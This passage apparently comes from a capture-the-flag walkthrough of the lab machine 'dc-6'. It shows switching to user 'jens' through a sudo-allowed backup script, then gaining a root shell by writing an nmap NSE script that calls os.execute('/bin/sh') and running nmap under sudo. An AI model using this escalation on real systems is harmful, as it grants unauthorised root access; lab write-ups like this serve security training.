5.2 Change user



a) Change to user “jens”

graham@dc-6:~$sudo -u jens /home/jens/backups.sh


b) Check “jens” permissions.

jens@dc-6:~$sudo -l


Output:


“jens” can run “nmap” as “root”.

c) To escalate “root privilege”, generate a “nmap script” to access “/bin/sh” shell called “root.nse” and then use “nmap” command to run the script with “sudo”.

jens@dc-6:~$echo "os.execute('/bin/sh')">/tmp/root.nse
jens@dc-6:~$sudo nmap --script=/tmp/root.nse


Output:


You have a shell as “root”.
